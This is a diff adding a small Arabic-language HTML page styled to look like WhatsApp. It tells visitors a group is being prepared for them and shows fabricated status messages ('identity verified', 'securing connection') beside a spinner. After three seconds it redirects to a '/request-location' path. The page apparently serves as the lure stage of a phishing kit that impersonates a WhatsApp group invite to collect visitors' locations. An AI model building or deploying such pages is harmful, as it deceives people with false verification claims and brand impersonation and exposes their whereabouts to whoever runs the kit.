@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>جاري التحويل</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #075E54;
+            color: white;
+            text-align: center;
+            padding: 50px;
+            direction: rtl;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #25D366;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .info-box {
+            background: rgba(255,255,255,0.1);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h2>جاري إعداد المجموعة لك...</h2>
+    <div class="loader"></div>
+    
+    <div class="info-box">
+        <p>✅ تم التحقق من الهوية</p>
+        <p>🔒 جاري تأمين الاتصال</p>
+        <p>📱 جاري تحميل المجموعة</p>
+    </div>
+    
+    <p>يرجى الانتظار لبضع ثواني</p>
+
+    <script>
+        // الانتقال التلقائي بعد 3 ثواني
+        setTimeout(() => {
+            window.location.href = '/request-location';
+        }, 3000);
+    </script>
+</body>
+</html>
